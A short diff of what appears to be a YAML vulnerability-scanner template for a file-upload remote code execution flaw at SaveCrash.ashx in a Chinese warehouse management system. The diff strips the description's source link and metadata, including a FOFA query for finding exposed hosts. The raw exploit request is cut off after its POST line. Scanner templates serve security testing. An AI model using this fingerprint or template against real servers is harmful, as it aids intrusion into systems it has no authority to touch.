@@ -3,12 +3,8 @@ info:
   name: 时空WMS-仓储精细化管理系统 SaveCrash.ashx 文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pg6gkk2gz99va1gn'
+  description: ''
   tags: rce,file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pg6gkk2gz99va1gn
-    fofa: body="SKControlKLForJson.ashx"
 http:
 - raw:
   - 'POST /crash/SaveCrash.ashx HTTP/1.1
